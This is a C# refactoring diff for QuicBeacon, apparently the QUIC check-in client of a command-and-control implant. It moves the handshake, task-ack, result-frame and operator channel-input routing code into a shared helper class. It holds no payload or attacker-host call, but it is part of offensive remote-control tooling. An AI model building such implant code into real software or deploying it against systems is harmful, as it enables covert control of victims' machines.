@@ -186,19 +186,6 @@ internal sealed class QuicBeacon : ICheckInClient
         return CheckInExit.Terminate;
     }
 
-    // What one connection produced, driving the retry policy in RunAsync.
-    private enum BeaconCycleResult
-    {
-        // The connection failed before or during the session; reconnect.
-        Dropped,
-
-        // The handshake succeeded and the session ran to its end.
-        Handshaken,
-
-        // The server refused the handshake permanently; terminate.
-        Terminal,
-    }
-
     // One connection: dial, handshake, then hold the session until the
     // server closes, the connection drops, or cancellation fires. Throws on
     // transport errors (the caller logs and reconnects); a refused handshake
@@ -211,18 +198,8 @@ internal sealed class QuicBeacon : ICheckInClient
         // The implant speaks first: the handshake frame -- re-opens (or
         // reuses) the session and re-advertises the baked class verbs
         // intersected with the compiled handlers (architecture.md Sec 5.3),
-        // replay-nonce arm offered.
-        var handshake = new HandshakeRequest
-        {
-            Version = new ProtocolVersion { Major = 1, Minor = 0 },
-            ImplantId = _implantId,
-            ReplayNonces = true,
-            // The receive-ack arm (architecture.md Sec 10.3), offered the same
-            // way: an echoing server gets an ack for every parsed task, and a
-            // stream that dies before the ack redelivers it.
-            TaskAcks = true,
-        };
-        handshake.Capabilities.Add(_handlers.AdvertisedVerbs(_classVerbs));
+        // both negotiation arms offered.
+        var handshake = BeaconFrames.Handshake(_implantId, _handlers.AdvertisedVerbs(_classVerbs));
         await wire.WriteFramesAsync(
             new[] { new Frame { Payload = ByteString.CopyFrom(handshake.ToByteArray()) } },
             CancellationToken.None);
@@ -259,7 +236,7 @@ internal sealed class QuicBeacon : ICheckInClient
         foreach (var remembered in _held.Undelivered())
         {
             await WriteFrameAsync(
-                wire, writeGate, ResultFrame(remembered.TaskId, remembered.Outcome, remembered.Output),
+                wire, writeGate, BeaconFrames.ResultFrame(remembered.TaskId, remembered.Outcome, remembered.Output),
                 cancellationToken);
             _held.MarkDelivered(remembered.TaskId);
         }
@@ -278,7 +255,7 @@ internal sealed class QuicBeacon : ICheckInClient
                     // operator input for a live channel, routed by task id.
                     if (frame.Kind == FrameKind.ChannelInput)
                     {
-                        RouteChannelInput(frame, liveChannels);
+                        BeaconFrames.RouteChannelInput(frame, liveChannels, _log);
                         continue;
                     }
 
@@ -289,7 +266,7 @@ internal sealed class QuicBeacon : ICheckInClient
                     // anything runs. The dedup half lives inside
                     // AcceptTaskingAsync, after verification.
                     if (acks)
-                        await WriteFrameAsync(wire, writeGate, AckFrame(task.TaskId), cancellationToken);
+                        await WriteFrameAsync(wire, writeGate, BeaconFrames.AckFrame(task.TaskId), cancellationToken);
                     await AcceptTaskingAsync(wire, writeGate, liveChannels, channelsGone.Token, task, cancellationToken);
                 }
 
@@ -465,7 +442,7 @@ internal sealed class QuicBeacon : ICheckInClient
         try
         {
             var (outcome, output) = await handler.Handle(task.Arguments, channel, lifetime);
-            await WriteFrameAsync(wire, writeGate, ResultFrame(task, outcome, output), CancellationToken.None);
+            await WriteFrameAsync(wire, writeGate, BeaconFrames.ResultFrame(task, outcome, output), CancellationToken.None);
             _held.Remember(task.TaskId, outcome, output);
             _held.MarkDelivered(task.TaskId);
             _log.WriteLine($"channel closed: task {task.TaskId} outcome {outcome}");
@@ -477,33 +454,6 @@ internal sealed class QuicBeacon : ICheckInClient
         finally
         {
             channel.CompleteInput();
-        }
-    }
-
-    // One ChannelInput frame: operator input for a live channel, routed by
-    // task id. Input for a task with no live channel is dropped and logged.
-    private void RouteChannelInput(
-        Frame frame,
-        ConcurrentDictionary<string, BeaconLiveChannel> liveChannels)
-    {
-        ChannelInput input;
-        try
-        {
-            input = ChannelInput.Parser.ParseFrom(frame.Payload);
-        }
-        catch (InvalidProtocolBufferException)
-        {
-            return;
-        }
-
-        if (liveChannels.TryGetValue(input.TaskId, out var channel))
-        {
-            if (!channel.Receive(input.Data.ToArray(), input.Eof))
-                _log.WriteLine($"channel input for task {input.TaskId} dropped: input queue full");
-        }
-        else
-        {
-            _log.WriteLine($"channel input for unknown task {input.TaskId} dropped");
         }
     }
 
@@ -585,30 +535,6 @@ internal sealed class QuicBeacon : ICheckInClient
         return _handlers.DispatchStaged(task.Verb, task.Arguments, payload);
     }
 
-    private static Frame ResultFrame(TaskRequest task, TaskOutcome outcome, string output)
-        => ResultFrame(task.TaskId, outcome, output);
-
-    private static Frame ResultFrame(string taskId, TaskOutcome outcome, string output)
-        => new()
-        {
-            Payload = ByteString.CopyFrom(new TaskResult
-            {
-                TaskId = taskId,
-                Outcome = outcome,
-                Output = output,
-            }.ToByteArray()),
-            Kind = FrameKind.TaskResult,
-        };
-
-    // The receive-ack frame (architecture.md Sec 10.3): delivery evidence for
-    // one parsed task, sent before anything executes.
-    private static Frame AckFrame(string taskId)
-        => new()
-        {
-            Payload = ByteString.CopyFrom(new TaskAck { TaskId = taskId }.ToByteArray()),
-            Kind = FrameKind.TaskAck,
-        };
-
     // Writes one task result and caches it in the held-task ledger, the same
     // bookkeeping the other stream clients keep.
     private async Task ReportResultAsync(
@@ -619,7 +545,7 @@ internal sealed class QuicBeacon : ICheckInClient
         string output,
         CancellationToken cancellationToken)
     {
-        await WriteFrameAsync(wire, writeGate, ResultFrame(taskId, outcome, output), cancellationToken);
+        await WriteFrameAsync(wire, writeGate, BeaconFrames.ResultFrame(taskId, outcome, output), cancellationToken);
         _held.Remember(taskId, outcome, output);
         _held.MarkDelivered(taskId);
     }
